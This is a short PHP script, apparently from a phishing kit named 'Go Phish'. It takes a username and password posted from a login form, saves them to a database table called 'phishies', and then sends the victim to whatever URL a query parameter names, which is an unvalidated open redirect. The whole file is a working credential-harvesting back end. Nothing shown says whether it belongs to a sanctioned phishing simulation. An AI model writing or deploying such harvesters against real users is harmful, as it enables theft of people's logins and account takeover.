<?php
	$username = $_POST["username"];
	$password = $_POST["password"];
	
	if($username && $password) {
		require("db.php");
				
		//insert the items into the db
		DB::insert('phishies', array(
			'username' => $username,
			'password' => $password
		));
		
		//take the user to the success URL
		header("location: " . $_GET["url"]);
	} else {
		//error - send to Go Phish homepage
		header("location: ../index.php?error=error");
	}
?>